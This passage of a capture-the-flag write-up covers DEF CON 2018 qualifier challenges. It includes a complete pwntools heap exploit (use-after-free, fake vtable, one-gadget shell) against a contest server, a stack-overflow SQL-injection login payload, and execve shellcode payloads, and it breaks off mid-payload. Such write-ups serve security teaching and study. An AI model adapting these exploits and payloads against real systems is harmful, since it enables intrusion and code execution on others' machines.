    sleep(1)
    send("ls")
    sleep(1)
    send("./exploit")

def pow_hash(challenge, solution):
    return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()

def check_pow(challenge, n, solution):
    h = pow_hash(challenge, solution)
    return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):
    candidate = 0
    while True:
        if check_pow(challenge, n, candidate):
            return candidate
        candidate += 1

if __name__ == '__main__':
    conn = remote(host,port)
    conn.recvuntil('Challenge: ')
    challenge = conn.recvuntil('\n')[:-1]
    conn.recvuntil('n: ')
    n = int(conn.recvuntil('\n')[:-1])

    print('Solving challenge: "{}", n: {}'.format(challenge, n))

    solution = solve_pow(challenge, n)
    print('Solution: {} -> {}'.format(solution, pow_hash(challenge, solution)))
    conn.sendline(str(solution))
    exploit(conn.sendline)
    conn.interactive()
```


ELF Crumble
-----------
The challenge present us with 8 fragment files and a "broken" binary.
A quick view of the binary shows that the first part is missing and replaced with X:

```
000005a0  55 89 e5 5d e9 57 ff ff  ff 8b 14 24 c3 58 58 58  |U..].W.....$.XXX|
000005b0  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
*
000008d0  58 58 58 58 8b 04 24 c3  66 90 66 90 66 90 66 90  |XXXX..$.f.f.f.f.|
000008e0  55 57 56 53 e8 c7 fb ff  ff 81 c3 e7 16 00 00 83  |UWVS............|
```

Without thinking too much we launched a bruteforce script:

```python
from pwn import *
from itertools import permutations
from subprocess import Popen
import os
from tqdm import tqdm

def make_executable(path):
    mode = os.stat(path).st_mode
    mode |= (mode & 0o444) >> 2    # copy R bits to X
    os.chmod(path, mode)


fragments = []
for i in range(8):
    with open('./fragment_'+ str(i+1)+'.dat','r') as f:
        fragments.append(f.read())
fragments = reversed(fragments)

for p in permutations(fragments):
    with open('broken','r') as b:
        bytes = b.read()
        with open('try','w') as t:
            t.write(bytes.replace('X'*(0x8d4-0x5ad), ''.join(p)))
        make_executable('try')
        p = subprocess.Popen(["./try"], stdout=subprocess.PIPE)
        out, err = p.communicate()
        if(len(out)>0): print out
```

This quickly prints out the flag.



Exzendtential-crisis
--------
We are given a [site](http://d4a386ad.quals2018.oooverflow.io/) with two forms in the homepage: one to register an account, and one to login to an account. There is also a "debug me" link that shows the source code of the page.

Once we register an account, we can write an essay on the page `essays.php`. This page lists all the essays that the user wrote, and provides a preview. Appending `?source` to the url shows the page source (as in index.php). There is an obvious file disclosure:

```php
if (isset($_GET['preview']))
{
   $dirname = "upload/${_SESSION['userid']}/";
   $fname = $_GET['name'];

   if (check_fname($fname) === False)
   {
      header("Location: /essays.php");
      exit();
   }
   $content = file_get_contents($dirname . $fname, False, NULL, 0, 524288);
   echo "<h1>Your essay submission</h1>";
   echo "<pre>";
   echo $content;
   echo "</pre>";
   echo "<br>";
   echo "<a href='essays.php'>back</a>";
   exit();
}
```

There is also a `flag.php` file, that only says:
```
Only sarte knows the flag. You are not him. Enjoy a quote though:
One love, a career, a revolution, as many companies as we begin ignoring their outcome
```

Retrieving `php.ini` with the file disclousure shows that there is a custom module in the PHP installation, called `mydb.so`. With the file disclousure we downloaded the module, and then we started reversing it.

After reversing the module, we find that it exports 3 functions to PHP: `create_user`, `get_result` (both used in `register.php`), and  `check_credentials` (used in `login.php`).
Internally, the module uses SQLite for storing user credentials, without validating the input (this is done on the PHP-side).
After looking a bit, we found an out-of-bounds write vulnerability that we can use to inject arbitrary SQL into a query.
In `check_credentials`, the module first retrieves the function arguments, and then calls `get_user_id` in order to verify the username/password. It passes to it a callback function, `check_hacking_attempt`, that takes two buffers, one containing the username, and one to copy the username to. It does some security checks before sending a query to SQLite. `check_hacking_attempt` copies the username string to the destination buffer, as long as its length is less than 150 characters. However, the destination buffer resides in the stack frame of `get_user_id`, which only allocated 112 bytes for it. Therefore, there is a 38 byte overflow.

In `get_user_id`, the destination buffer is located just before a table name buffer, which contains the name of the table used in the user selection query. By overwriting the table name, we can inject arbitrary SQL into the query. The injection that we choose is pretty trivial: `users where username="sarte" -- `.

The final payload is generated by the Python snippet `print('a' * 112 + 'users where username="sarte" -- ')`, that once inserted as username in the login, authenticates us as `sarte`. We can now retrieve the flag.


Flagsifier
----------
This challenge consisted in finding the correct input for a Deep Neural Network
that classifies images (size: `1064x28`) and has 40 output neurons.

There were some example images, composed of 38 letters from what looked like the EMNIST dataset.
All of them activated the fourth neuron, therefore being classified as the fourth class.

Some quick tests by moving around random letters and removing some others (plus, the structure
of the network) hinted us that there was a softmax and the classes were represented as one-hot
encoding. Therefore, the network classifies images into 40 classes. Time to discover what they are!

So, at first we transcribed the sample images and used the combination
of tile + corresponding text as dataset.

```python
dataname=["RUNNEISOSTRICHESOWNINGMUSSEDPURIMSCIVI",
        "MOLDERINGIINTELSDEDUCINGCOYNESSDEFIECT",
        "AMADOFIXESINSTIIIINGGREEDIIVDISIOCATIN",
        "HAMIETSENSITIZINGNARRATIVERECAPTURINGU",
        "ELECTROENCEPHALOGRAMSPALATECONDOIESPEN",
        "SCHWINNUFAMANAGEABLECORKSSEMICIRCLESSH",
        "BENEDICTTURGIDITYPSYCHESPHANTASMAGORIA",
        "TRUINGAIKALOIDSQUEILRETROFITBIEARIESTW",
        "KINGFISHERCOMMONERSUERIFIESHORNETAUSTI",
        "LIQUORHEMSTITCHESRESPITEACORNSGOALREDI"]
```
(Finding typos in this transcription is left as an exercise to the reader
:smile: )

After that we divided all the sample images in 38 28x28-tiles (one tile per
letter).
We have done that using this script:

```python
dataset=[]
datalet=[]
datax={}

for i in range(0,8):
    img = Image.open('./sample_%d.png'%i)
    for j in range(0,38):
        x=img.crop((j*28,0,(j+1)*28,28))
        dataset.append(x)
        datalet.append(dataname[i][j])
        let=dataname[i][j]
        if let not in datax:
            datax[let] = []
        datax[let].append(len(dataset)-1)
```

* `dataset` contains the images.
* `datalet[i]` contains the corresponding text of `dataset[i]`.
* `datax` contains the  mapping between letters and array of samples. Basically
it answers to questions like: "which dataset entries correspond to a particular
letter?"

Then, we experimented as follows: for each letter, starting from a black image,
put the letter in position 0...38, and classify these images. We saved all the
predictions, and then averaged them to see the most likely class for each letter.

We discovered that neurons 14...40 clasified letters: neuron 14 activated for A,
neuron 15 for B, up to neuron 40 for Z.

We then need to discover what the neurons 1...14 classify, as some of them probably
classify the flag.
To do that, we need to try to find inputs that maximize the activation of these, one at
a time. Another thing that we can leverage is that the flag likely starts by `OOO`.

So, what would one usually do here, with a "real" network? Decide which neuron (e.g.,
the first) to try to activate, then create random 38-letters inputs, and then use the
log-likelihood of that neuron for that input as the fitness function for his favourite
optimization algorithm (e.g., this problem looked perfect for genetic algorithms).

But before throwing cannons to the problem, let's try something simpler (and if it fails, 
move to more advanced but computationally intensive stuff).
The suspect here is that the network is trained on a small dataset, and is strongly
overfitting the flag on some of the "low" neurons. This could maybe mean that
the function we need to optimize is not crazily non-linear and with tons of local optima
that require complex optimization algorithms to escape from. Therefore we tried with
a simple greedy strategy: for each of the 38 positions, pick the letter that maximizes the
output of the target neuron. And it worked!

Trying `OOO` as a test string showed activation of neurons 2 and 3 - let's focus on them.

### Results

Neuron 2 has been our first guess, which gave us these (highly noisy) strings, 
with the greedy strategy:
```
OOOOTHISISBYKCOZMEKKAGETONASTEYOUATIMW
OOOOTHISISBYKCOZMKYKAGZTONBSTWVOUATIWM
OOOOTNISISBDKCOZMKSGBGETONMSTXVOUWTIRR
OOOOTOISISOYECOIUEYSOGETONOSTNVOUOTIWW
```

We tried (failing) to submit some flags like
* `OOOOTHISISBYKCOZMESSAGETOHASTEYOLATINE`
* `OOOOTHISISBYKCOZMESSAGETOHASTEYOLATINW`
* ...

After realizing that neuron 2 was just a test-neuron, we changed output neuron
from 2nd to 3rd and we got sentences like:

```
OGOSOMEAUTHTNTICINTEIXIGXNCCISVEGUIWEG
OOOSOMRAUTHGNTICINTGIIIGGNGGISMRGUIWEG
OOOSOMXAUTHENTICINTEKXIGXNCRISRRRRIRER
OOOSOYEOLTUTNTICINTEIIIGCNCEIIETOLIRTI
RROSOMEAUTHTNTICINTEIXIGXNCCISVEGUIWEG
```

We obtained `OOOSOMEAUTHENTICINTELLIGENCEIS........` by averaging (and manually
correcting) them and after few tries of guessing ( :bowtie: ) the last word we
obtained the correct flag: `OOOSOMEAUTHENTICINTELLIGENCEISREQUIRED`.

### Python script
You can find here the full python script we have used (keras + tensorflow-gpu):

```python
#!/usr/bin/env python

import numpy as np
from keras.models import load_model
from keras.preprocessing import image
from keras.datasets import mnist
from keras.applications.resnet50 import preprocess_input, decode_predictions

from PIL import Image, ImageDraw, ImageFont
import string, random, sys

dataset=[]
datalet=[]
datax={}
dataname=["RUNNEISOSTRICHESOWNINGMUSSEDPURIMSCIVI",
        "MOLDERINGIINTELSDEDUCINGCOYNESSDEFIECT",
        "AMADOFIXESINSTIIIINGGREEDIIVDISIOCATIN",
        "HAMIETSENSITIZINGNARRATIVERECAPTURINGU",
        "ELECTROENCEPHALOGRAMSPALATECONDOIESPEN",
        "SCHWINNUFAMANAGEABLECORKSSEMICIRCLESSH",
        "BENEDICTTURGIDITYPSYCHESPHANTASMAGORIA",
        "TRUINGAIKALOIDSQUEILRETROFITBIEARIESTW",
        "KINGFISHERCOMMONERSUERIFIESHORNETAUSTI",
        "LIQUORHEMSTITCHESRESPITEACORNSGOALREDI"]


for i in range(0,8):
    img = Image.open('./sample_%d.png'%i)
    for j in range(0,38):
        x=img.crop((j*28,0,(j+1)*28,28))
        dataset.append(x)
        datalet.append(dataname[i][j])
        let=dataname[i][j]
        if let not in datax:
            datax[let] = []
        datax[let].append(len(dataset)-1)

def genImg(n):
    img = Image.new('1', (1064,28), color='black')
    #for i in range(max(0,len(n)-1),len(n)): # only this letter and everything else black
    for i in range(0,len(n)):
        img.paste(dataset[n[i]], (i*28,0))
    return img


model = load_model('model.h5')
model.compile(loss='binary_crossentropy', optimizer='rmsprop', metrics=['accuracy'])

def eeval2(a, op):
    img = genImg(a)
    x = image.img_to_array(img)
    x = np.expand_dims(x, axis=0)
    classes = model.predict(x)
    score = float(classes[0][op])
    return score

for oo in range(2,40): # start from 2, this one seems correct
#   out=[datax[x][0] for x in 'OOOSOMEAUTHENTICINTELLIGENCEIS'] #do not start from zero
    out=[]
    for i in range(len(out),38):
        maxv=([], -99999)
        for j in datax:
            for k in datax[j]:
                out.append(k)
                score = eeval2(out, oo)
                if score > maxv[1]:
                    maxv = (0, score, j)
                out.pop()

        sys.stdout.write("[%d] %38s : %.10lf      \r" % (oo, ''.join([datalet[x] for x in out]), maxv[1]))
        sys.stdout.flush()
        out.append(datax[maxv[2]][0])

    print("")
    print("--Neuron %d: %s" % (oo, ''.join([datalet[x] for x in out])))
```



Geckome
-------
Another web challenge, this time served at http://d2b24dd8.quals2018.oooverflow.io. After logging in with the provided credentials `admin@oooverflow.io:admin`, we are redirected to the following [browser test page](http://d2b24dd8.quals2018.oooverflow.io/browsertest.php):

```html
<html>
    <head>
        <title>Testing the browser...</title>
        <style> 
            #animated_div {
            width:120px;
            height:47px;
            background: #92B901;
            color: #ffffff;
            position: relative;
            font-weight:bold;
            font-size:20px;
            padding:10px;
            -webkit-animation:animated_div 5s 1;
            border-radius:5px;
            -webkit-border-radius:5px;
            }

            @-webkit-keyframes animated_div
            {
            0% {-webkit-transform: rotate(0deg);left:0px;}
            25% {-webkit-transform: rotate(20deg);left:0px;}
            50% {-webkit-transform: rotate(0deg);left:500px;}
            55% {-webkit-transform: rotate(0deg);left:500px;}
            70% {-webkit-transform: rotate(0deg);left:500px;background:#1ec7e6;}
            100% {-webkit-transform: rotate(-360deg);left:0px;}
            }

 
        </style>
    </head>

    <video id="v" autoplay> </video>
    <a href="https://www.w3schools.com/html" ping="https://www.w3schools.com/trackpings">
    <p onclick="p()">Click me to print the page.</p>
    <link rel="prerender" href="https://news.ycombinator.com/">
    <div id="animated_div">OOOverflow Securityyy</div>
    <script>
        var f = "";
        if (navigator.onLine)
            f += "o";
        f += navigator.vendor;
        function p() { 
            window.print();
        }
        /* incompatible
        window.onbeforeprint = function () {
            // some code    
        }
        */
        f += navigator.mimeTypes.length;
        x=0; for ( i in navigator ) { x += 1; } f += x;
        x=0; for ( i in window ) { x += 1; } f += x;
        // hash
        function str2ab(str) {
            var buf = new ArrayBuffer(str.length*2); // 2 bytes for each char
            var bufView = new Uint16Array(buf);
            for (var i=0, strLen=str.length; i<strLen; i++) {
                bufView[i] = str.charCodeAt(i);
            }
            return buf;
        }
        function sha256(str) {
            // We transform the string into an arraybuffer.
            var buffer = str2ab(str);
            return crypto.subtle.digest({name:"SHA-256"}, buffer).then(function (hash) {
                return hex(hash);
            });
        }

        function hex(buffer) {
            var hexCodes = [];
            var view = new DataView(buffer);
            for (var i = 0; i < view.byteLength; i += 4) {
                // Using getUint32 reduces the number of iterations needed (we process 4 bytes each time)
                var value = view.getUint32(i)
                // toString(16) will give the hex representation of the number without padding
                var stringValue = value.toString(16)
                // We use concatenation and slice for padding
                var padding = '00000000'
                var paddedValue = (padding + stringValue).slice(-padding.length)
                hexCodes.push(paddedValue);
            }

            // Join all the hex strings into one
            return hexCodes.join("");
        }
        f += navigator.plugins[0].filename;
        f += navigator.plugins[1].description;

        sha256(f).then(function(digest) {
            if (digest == "31c6b7c46ff55afc8c5e64f42cc9b48dde6a04b5ca434038cd2af8bd3fd1483a") {
                window.location = "flag.php?f=" +btoa(f);
            } else {
                x = document.getElementById("animated_div");
                z = document.createElement("div");
                z.innerHTML = "Test Failed";
                z.id="animated_div";
                setTimeout(function() {x.appendChild(z)}, 5000);
            }
        });
        console.log("FIN");
    </script>
</html>
```

A quick overview of the inline script suggests that the flag can be accessed by the admin iff a matching browser is used. The client is checked for the presence of certain plugins, the ability to execute selected APIs outside secure-contexts such as `SubtleCrypto` and lack of support for `window.onbeforeprint` (see the commented out code in the js). Moreover, several `-webkit-` prefixed CSS rules wink at WebKit-powered user agents.

By cross-checking all the conditions, the list of possible candidates reduced to Google Chrome between versions 37 and 39 (included). At this point it was just a matter of running these [old browsers](https://google-chrome.en.uptodown.com/ubuntu/old) inside a VM, dump the list of plugins along with other features exploited by the fingerprinting function and use a bit of (brute) force.

```python
import hashlib
import sys

h = '31c6b7c46ff55afc8c5e64f42cc9b48dde6a04b5ca434038cd2af8bd3fd1483a'

mime_types = range(0, 10)
navigator = range(0, 46)
windows = range(150, 231)

vendors = ['Google Inc.']
plugin0_filenames = ['', 'libwidevinecdmadapter.so', 'libppGoogleNaClPluginChrome.dll', 'undefined', 'libpepflashplayer.dll', 'libppGoogleNaClPluginChrome.so', 'internal-remoting-viewer', 'libpepflashplayer.so', 'internal-nacl-plugin', 'internal-pdf-viewer', 'mhjfbmdgcfjbbpaeojofohoefgiehjai', 'libwidevinecdmadapter.dll', 'libpdf.so', 'libpdf.dll']
plugin1_descr = ['', 'This plugin allows you to securely access other computers that have been shared with you. To use this plugin you must first install the <a href="https://chrome.google.com/remotedesktop">Chrome Remote Desktop</a> webapp.', 'undefined', 'Shockwave Flash 14.0 r0', 'Enables Widevine licenses for playback of HTML audio/video content.', 'Portable Document Format', 'Enables Widevine licenses for playback of HTML audio/video content. (version: Something fresh)'] + ['Shockwave Flash {}.{} r0'.format(maj, mino) for maj in range(18) for mino in range(5)]

for ven in vendors:
	for mt in mime_types:
		for nav in navigator:
			for win in windows:
				for p0 in plugin0_filenames:
					for p1 in plugin1_descr:
						# simulate utf-16 encoding
						data = ''.join(c+'\x00' for c in 'o{}{}{}{}{}{}'.format(ven, mt, nav, win, p0, p1))
						if h == hashlib.sha256(data).hexdigest():
							print('[FOUND] {}'.format(data))
							sys.exit(0)
```

The script returns the string `oGoogle Inc.828186libpepflashplayer.soThis plugin allows you to securely access other computers that have been shared with you. To use this plugin you must first install the <a href="https://chrome.google.com/remotedesktop">Chrome Remote Desktop</a> webapp.` that can be used, in a base64-encoded form, to access the flag:

```bash
$ curl 'http://d2b24dd8.quals2018.oooverflow.io/flag.php?f=b0dvb2dsZSBJbmMuODI4MTg2bGlicGVwZmxhc2hwbGF5ZXIuc29UaGlzIHBsdWdpbiBhbGxvd3MgeW91IHRvIHNlY3VyZWx5IGFjY2VzcyBvdGhlciBjb21wdXRlcnMgdGhhdCBoYXZlIGJlZW4gc2hhcmVkIHdpdGggeW91LiBUbyB1c2UgdGhpcyBwbHVnaW4geW91IG11c3QgZmlyc3QgaW5zdGFsbCB0aGUgPGEgaHJlZj0iaHR0cHM6Ly9jaHJvbWUuZ29vZ2xlLmNvbS9yZW1vdGVkZXNrdG9wIj5DaHJvbWUgUmVtb3RlIERlc2t0b3A8L2E+IHdlYmFwcC4='
OOO{th3r3c@nb30nly0n3br0ws3r!}
```

Flag: `OOO{th3r3c@nb30nly0n3br0ws3r!}`


Ghettohackers: Throwback
------------------------
A .txt file is provided with the following content:

```
Anyo!e!howouldsacrificepo!icyforexecu!!onspeedthink!securityisacomm!ditytop!urintoasy!tem!
```

Given that our brains have been compromised since a long time by playing too many CTFs, we quickly figured out that it was enough to count the number of chars before each `!` to get the index of a single letter of the flag. For instance, `Anyo! = d` because there are 4 chars before the `!` and so we must consider the 4th letter of the English alphabet.

Python one-liner to solve the challenge:

```python
>>> import string
>>> s = 'Anyo!e!howouldsacrificepo!icyforexecu!!onspeedthink!securityisacomm!ditytop!urintoasy!tem!'
>>> ''.join(string.ascii_lowercase[len(c)-1] if c else ' ' for c in s.split('!')).rstrip()
'dark logic'
```

Flag: `dark logic`


It's-a me!
----------
We're given an x64 Linux ELF, written in C++, with full RELRO, stack canaries, NX, and PIE. We can create users, order and cook pizzas and so on. To order pizzas, ingredients are specified using UTF-8 sequences. When cooking pizzas, we can specify an explanation, which will be allocated on the heap (with a dynamic size depending on the input size).

We notice that it is apparently impossible to order a pineapple pizza (sequence `\xf0\x9f\x8d\x8d`). However, we can order a pizza with ingredients `\xf0\xf0\xf0\x9f` and `\x8d\x8d`, which are valid sequences and will be concantenated when cooking, creating the pineapple ingredient. After cooking a pineapple pizza, Mario gets mad at us. We can log out, or edit our explanation (which logs us out afterwards). From the logged out menu, we can see the explanation we gave.

There is a use-after-free here. When cooking, if we carefully set up an order (e.g., 16 pineapple pizzas and 1 tomato pizza), we can make the program free the explanation buffer while keeping a pointer to it for editing and printing. Also, the editing size is fixed (300), while the actual size of the once-allocated explanation can vary, so there's an overflow, too (we didn't use it).

We first print out a freed explanation unsorted bin to leak the heap (there's another freed unsorted due to vector resizing). Then, we edit an unsorted bin's links to write `main_arena` into the explanation itself at the next `malloc`. By printing the explanation, we leak libc. Finally, we allocate and free an explanation with the same size as a pizza object, then get a pizza allocated in that free fastbin and leak the binary's base through the vtable pointer.

Then, we edit a fastbin-sized free explanation to link a fake fastbin in BSS, near the currently logged user pointer. After setting up a fake user and a bunch of related fake structures in buffers residing in BSS, we overwrite the current user with the fake one through the fake fastbin. Finally, the admire option in the user menu can be used to trigger a virtual method invocation on a fake pizza belonging to the fake user. The fake vtable of the pizza will call a onegadget, popping a shell.

Exploit:

```python
#!/usr/bin/env python2

from pwn import *
from pow import solve_pow

context(arch='x86_64', os='linux')

def pow_connect():
    p.recvuntil('Challenge: ')
    challenge = p.recvline().strip()
    p.recvuntil('n: ')
    n = int(p.recvline())
    prog = log.progress('Solving PoW ({} {})'.format(challenge, n))
    sol = solve_pow(challenge, n)
    prog.success('found {}'.format(sol))
    p.recvuntil('Solution: \n')
    p.sendline(str(sol))

#context.log_level = 'debug'
#p = process('./mario')
p = remote('83b1db91.quals2018.oooverflow.io', 31337)
pow_connect()

def menu(choice):
    p.recvuntil('Choice: ')
    p.sendline(choice)

# MAIN MENU

def new_customer(name):
    menu('N')
    p.recvuntil('name? ')
    p.sendline(name)

def login(name):
    menu('L')
    p.recvuntil('name? ')
    p.sendline(name)

def why_upset():
    menu('W')
    p.recvuntil('say: ')
    tail = '\nniente scuse\n'
    return p.recvuntil(tail)[:-len(tail)]

# USER MENU

def logout():
    menu('L')

def order(pizzas):
    menu('O')
    p.recvuntil('pizzas? ')
    p.sendline(str(len(pizzas)))
    for pizza in pizzas:
        p.recvuntil('ingredients? ')
        p.sendline(str(len(pizza)))
        for i in pizza:
            p.recvuntil(': ')
            p.sendline(i)

def cook(explanation=''):
    menu('C')
    p.recvuntil('explain: ')
    p.sendline(explanation)

def admire():
    menu('A')

def explain(explanation):
    menu('P')
    p.recvuntil('yourself: ')
    p.sendline(explanation)

def go_away():
    menu('Y')

TOMATO = '\xf0\x9f\x8d\x85'
PINEAPPLE_PIZZA = ['\xf0\xf0\xf0\x9f', '\x8d\x8d']
FREED_EXPLANATION_ORDER = [PINEAPPLE_PIZZA] * 16 + [[TOMATO]]

prog = log.progress('Leaking heap')
# leak fd from unsorted bin through UAF
# fd points to heap because the pizza vector reallocation freed
# a (now) unsorted chunk before us
new_customer('heapleak')
order(FREED_EXPLANATION_ORDER)
cook('A' * 200)
go_away()
heap_leak = u64(why_upset().ljust(8, '\x00'))
prog.success('~ 0x{:012x}'.format(heap_leak))

prog = log.progress('Leaking libc')
# corrupt an explanation's unsorted fd to &explanation-0x10
new_customer('libcleak')
order(FREED_EXPLANATION_ORDER)
cook('A' * 200)
explain(p64(heap_leak + 0x4b0 - 0x10)[:6])
# allocate a chunk to write main_arena to *(fd+0x10) -> explanation
new_customer('unsorted')
logout()
# leak main_arena through the explanation
libc_base = u64(why_upset().ljust(8, '\x00')) - 0x3c4c48
prog.success('@ 0x{:012x}'.format(libc_base))

prog = log.progress('Leaking PIE ')
# get a 0x40 free leakable explanation chunk
new_customer('binleak')
order(FREED_EXPLANATION_ORDER)
cook('B' * 0x37)
go_away()
# allocate a bad pizza (0x40 chunk) over the explanation
new_customer('badpizza')
order([['X']] * 10)
cook()
logout()
# leak the binary through the bad pizza's vtable ptr
bin_base = u64(why_upset().ljust(8, '\x00')) - 0x20bbe0
prog.success('@ 0x{:012x}'.format(bin_base))

NAME_ADDR = bin_base + 0x20c5e0
EXPLANATION_ADDR = bin_base + 0x20c480

prog = log.progress('Hijacking vtable')
# link a fake 0x20 fastbin just before the upset and logged user ptrs in BSS
FAKE_FAST_ADDR = EXPLANATION_ADDR + 0x120
new_customer('fakefast')
order(FREED_EXPLANATION_ORDER)
cook('\x00'*0x128 + '\x21')
explain(p64(FAKE_FAST_ADDR)[:6])
# we lay out fake structures in the BSS name buffer
USER_ADDR = NAME_ADDR + 8
PIZZA_PTR_ARRAY_ADDR = USER_ADDR + 0x48
PIZZA_ADDR = PIZZA_PTR_ARRAY_ADDR + 8
VTABLE_ADDR = PIZZA_ADDR + 0x18
# fake vtable for a pizza, calls onegadget from admire
ONE_GADGET = libc_base + 0x4526a
vtable = p64(ONE_GADGET)
# fake pizza, with our fake vtable
pizza = p64(VTABLE_ADDR) + 'A'*16
# fake array of pizzas, with our fake pizza
pizza_ptr_array = p64(PIZZA_ADDR)
# fake list for pizza_ptr_array
pizza_list  = p64(PIZZA_PTR_ARRAY_ADDR)   # begin ptr
pizza_list += p64(PIZZA_PTR_ARRAY_ADDR+8) # end ptr
pizza_list += '\x00'*8
# fake user, with pizza_list
user  = '\x00'*(8+0x18+8) # name, uncooked pizzas, explanation
user += pizza_list        # list of cooked pizzas
user += '\x00'*8          # ensure invalid user flag = 0
# throw everything into the BSS name buffer
# strlen = 0 -> waste an 0x20 fastbin, bringing our fake fastbin to head
new_customer('\x00'*8 + user + pizza_ptr_array + pizza + vtable)
# will allocate explanation on fake fastbin
# overwrite logged user ptr with fake user
cook('A'*8 + p64(USER_ADDR)[:6])
# invoke onegadget via fake vtable
admire()
prog.success('pwned!')

p.recvline()
p.interactive()
```



Note Oriented Programming
------------------------
We had remote access to the challenge and we've been provided with the executable `nop`.  
We could only insert some integer values that after certain operations became strings representing notes and octaves. We could execute 'notes' from `A0` to `G#8`.
Seems like we have to craft a musical shellcode!


### Reversing 

The program allocates two sections at `0x40404000`, and `0x60606000`:  
It will store the user input in the first section -that we will call `USER_INPUT`- and a set of musical notes expressed in alphabetical notation in the latter -that we will call `CODE` as the program will jump to it to 
play our song-.

```
0x40404000 0x40405000 rw-p     1000 0
0x565a6000 0x565a7000 r-xp     1000 0      /home/mhackeroni/ctf/defconquals18/nop/nop                         
0x565a7000 0x565a8000 r--p     1000 0      /home/mhackeroni/ctf/defconquals18/nop/nop                         
0x565a8000 0x565a9000 rw-p     1000 1000   /home/mhackeroni/ctf/defconquals18/nop/nop                         
0x60606000 0x60608000 rwxp     2000 0
```

After reading the user input, it will starts processing it by reading a word at a time, and translate each word into the a set of notes (e.g., G#0, B7)
into the `CODE` section: the program will stop parsing notes at the first `\xff\xff`, but will stop reading our inputs at the first `\x00\x00`: an extremely
valuable *feature* allowing us to have an unconstrained user input at a specific location.

Before the shellcode, the program puts a small stub that cleans useful registers, and copies `ESP` in `ESI` and `EDI`. An `int 80` will be concatenated at the end of our code.


### Shellcoding

Our first aim was to retrieve a list of all the instructions we could use. We combined several notes and disassembled them with capstone in order to have some useful "gadget" to build the shellcode.  

```python
from math import log             
from collections import defaultdict                               
from capstone import *           
import itertools                 
import re                        

fmin = 27                        
fmax = 26590                     

notes_array = ['A', 'A#', 'B', 'C', 'C#', 'D', 'D#', 'E', 'F', 'F#', 'G', 'G#']                                                      


def tonote(freq):                
    v3 = log(float(freq) / 27.5, 2) * 12.0 + 0.5;                 
    v3 = int(v3)                 
    note = "%s%d" % (notes_array[v3 % 12], (v3 / 12));            
    return note                  

gadgets = defaultdict(list)      
gadgets_reverse = defaultdict(list)                               

for f in range(fmin, fmax):      
    gadgets[tonote(f)].append(f) 
    gadgets_reverse[f].append(tonote(f))                          


md = Cs(CS_ARCH_X86, CS_MODE_32) 
baseaddr = 0x60606000            


def disasm(code, address):       
    instructions = ''            
    regex = r'ptr \[e[bcd]x'     
    size = 0                     
    for i in md.disasm(code, address):                            
        size += i.size           
        instructions += '%s %s; ' % (i.mnemonic, i.op_str)        
        if re.findall(regex, i.op_str):                           
            return None          

    if size != len(code):        
        return None              

    return instructions          

instructions = defaultdict(dict) 
for k in itertools.combinations(gadgets.keys(), 3):               
    ins = disasm(''.join(k), baseaddr)                            
    if ins is None:              
        continue                 
    print '\'%s\'    #%s' % (''.join(k), ins)                     

for k in instructions.keys():    
    for l in instructions[k].keys():                              
        print "%s %s" % (k, l)   
```

There are no `mov` nor `push` and `pop` gadgets, only a few `inc`, some `xor`, and a couple `and`.  
Unfortunately, the only control we excert over `esi` and `edi` is via the `and` instruction, like:
```
169:'G6A#0'    #inc edi; inc ecx; and esi, dword ptr [eax];                                                            
170:'G6A#7'    #inc edi; inc ecx; and esi, dword ptr [edi];   
```

Although we were able to write bytes into the stack, the biggest problem for us was to write the right address into the right register so to call another `read()` or an `execve()`.  

Since we weren't provided with enough instructions to set the registers like `ecx` and `ebx`, we all agreed on the fact that our exploit had to be done in two stages and that
the first stage had to change bytes in the `CODE` section.   
We all decided to use a mask like `0x6060ff0` to make `esi` point to our `CODE` section, and used it to xor the instruction we needed into our NOP sled. Challenging ASLR will make our exploits not 100% reliable.  
Oh, and since we are tough guys, we went straight for an `execve()`.


### Three different Exploits

At a certain point in the night we realized we could write (`\x00\x00` excluded for obviuos reasons) every byte we wanted between `\xff\xff` and `\x00\x00` in the `USER_INPUT` section.  
That's when we started coming up with different ideas. We split in three and developed three different working exploits.  
One exploit was based on the use of the stack, the other two took advantage of the `USER_INPUT` section.  

In order to set eax and al to the desired values we wrote a clever solver in z3 that used values that could be found in the stack.

#### First Exploit

The first idea was to xor values on the stack to write the mask, `/bin//sh`, and `mov ebx, edi`. Then we would set `edi` to point to `/bin//sh` and write the byte for  `mov ebx, edi` into the nop sled.

```python
from pwn import *

############### IDEA ################

#Want to change part of the stack in this way

#Before

# OOOOOOOOOOOO---- Welcome to Note Oriented Programming!! ----OOOOOOOOOOOOOOOOOOOO

#After 

# OOOOOOOOOOOO---- Welcome to Note O\x00\x65\x60\x60ted Progra/bin//sh\x00---\x89\xfb\x90 OOOOOOOOOOOOOOOOO

#And between 0x60606500 and esi (may ASLR be with us)
#Set edi to point to /bin//sh
#Change the first 4 byte of the new esi pointer into 89fb(mov ebx, edi)
#Finally set the value of eax to 0xb and place useless instructions in order to change a part of them with the mov.

#Writing /bin//sh

payload = "\x30\x00\x2b\x00" * 43
payload += "\x3b\x02\x1e\x00\x36\x5f"  
payload += "\xfa\x02\x78\x00\x36\x5f"
payload += "\x24\x00\x36\x5f"
payload += "\x2b\x00\x2b\x00" * 25
payload += "\xaa\x00\x2b\x00"
payload += "\x3b\x02\xb8\x1a\x36\x5f\x3b\x02\xfe\x1d\x36\x5f"
payload += "\x8f\x00\xce\x17"
payload += "\x24\x00\x36\x5f\xbf\x00\x9b\x2f"
payload += "\x36\x5f\xbf\x00"
payload += "\x36\x5f\xbf\x00"
payload += "\x8f\x00\x9b\x0a"
payload += "\xfa\x02\xfb\x3b\x36\x5f"
payload += "\xfa\x02\x54\x47\x36\x5f"
payload += "\x24\x00\xce\x17"
payload += "\x30\x00\x36\x5f"
payload += "\x3b\x02\xd3\x54\x36\x5f"
payload += "\x24\x00\xce\x17"
payload += "\x8f\x00\x2b\x00"
payload += "\x8f\x00\x54\x01"
payload += "\x3b\x02\x10\x50\x36\x5f"
payload += "\x30\x00\xce\x17"
payload += "\xd3\x54\x36\x5f" * 11
payload += "\x8f\x00\xd3\x54"
payload += "\xfa\x02\x70\x35\x36\x5f"
payload += "\xfa\x02\x8c\x3f\x36\x5f"
payload += "\x8f\x00\x9b\x2f"
payload += "\x30\x00\xe7\x0b"


#Writing 0x60606500

payload += "\x8f\x00\x9b\x2f"
payload += "\x8f\x00\xa7\x02"
payload += "\x24\x00\xa7\x02"
payload += "\x8f\x00\x60\x00"
